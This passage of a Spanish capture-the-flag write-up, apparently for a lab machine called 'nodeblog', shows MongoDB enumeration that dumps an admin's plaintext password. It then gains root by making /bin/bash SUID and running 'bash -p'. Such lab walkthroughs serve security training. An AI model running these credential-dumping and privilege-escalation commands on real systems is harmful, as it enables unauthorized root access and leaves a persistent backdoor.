+<p>Entonces lo que queda es empezar a enumerar la base de datos, usando el comando <strong>mongo</strong> nos conectaremos a la base de datos, si usamos <strong>show databases</strong> veremos todas las bases de datos existentes:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="n">show</span> <span class="n">databases</span>
+<span class="n">admin</span>   <span class="mf">0.000</span><span class="no">GB</span>
+<span class="n">blog</span>    <span class="mf">0.000</span><span class="no">GB</span>
+<span class="n">config</span>  <span class="mf">0.000</span><span class="no">GB</span>
+<span class="n">local</span>   <span class="mf">0.000</span><span class="no">GB</span>
+</code></pre></div></div>
+
+<p>Ahora usando <strong>use blog</strong> le indicaremos que haremos uso de la base de datos <strong>blog</strong>, despues usaremos <strong>show collections</strong> para mostrar todas las colecciones existentes en esa base de datos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="n">show</span> <span class="n">collections</span>
+<span class="n">articles</span>
+<span class="n">users</span>
+</code></pre></div></div>
+
+<p>Despues usamos <strong>find()</strong> para mostar todo el contenido de la coleccion <strong>users</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="n">db</span><span class="p">.</span><span class="nf">users</span><span class="p">.</span><span class="nf">find</span><span class="p">()</span>
+<span class="p">{</span> <span class="s2">"_id"</span> <span class="p">:</span> <span class="no">ObjectId</span><span class="p">(</span><span class="s2">"61b7380ae5814df6030d2373"</span><span class="p">),</span> <span class="s2">"createdAt"</span> <span class="p">:</span> <span class="no">ISODate</span><span class="p">(</span><span class="s2">"2021-12-13T12:09:46.009Z"</span><span class="p">),</span> <span class="s2">"username"</span> <span class="p">:</span> <span class="s2">"admin"</span><span class="p">,</span> <span class="s2">"password"</span> <span class="p">:</span> <span class="s2">"IppsecSaysPleaseSubscribe"</span><span class="p">,</span> <span class="s2">"__v"</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Podemos ver que las credenciales para el usuario admin es <strong>IppsecSaysPleaseSubscribe</strong></p>
+
+<p>Si recordamos anteriormente, cuando listamos que podiamos ejecutar a nivel de sudoers, nos pedia una contraseña para el usuario admin, asi que ahora usaremos el <strong>sudo -l</strong> y la contraseña sera la que acabamos de sacar:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="ss">admin: 
+</span><span class="no">Matching</span> <span class="no">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">admin</span> <span class="n">on</span> <span class="ss">nodeblog:
+    </span><span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
+    <span class="n">secure_path</span><span class="o">=</span><span class="sr">/usr/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">\</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">\</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">\</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="p">\</span><span class="ss">:/</span><span class="n">sbin</span><span class="p">\</span><span class="ss">:/</span><span class="n">bin</span><span class="p">\</span><span class="ss">:/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
+
+<span class="no">User</span> <span class="n">admin</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="ss">nodeblog:
+    </span><span class="p">(</span><span class="no">ALL</span><span class="p">)</span> <span class="no">ALL</span>
+    <span class="p">(</span><span class="no">ALL</span> <span class="p">:</span> <span class="no">ALL</span><span class="p">)</span> <span class="no">ALL</span>
+</code></pre></div></div>
+
+<p>Podemos ver que como el usuario admin podemos ejecutar lo que sea, asi que simplemente podemos darle permisos SUID la bash y luego ejecutar un <strong>bash -p</strong> y ya seriamos root</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="sr">/bin/</span><span class="n">bash</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bash</span> <span class="o">-</span><span class="nb">p</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">admin</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">home</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="sr">/bin/</span><span class="n">bash</span>
+<span class="n">admin</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">home</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="nb">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1"># whoami</span>
+<span class="n">root</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1">#</span>
+</code></pre></div></div>
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
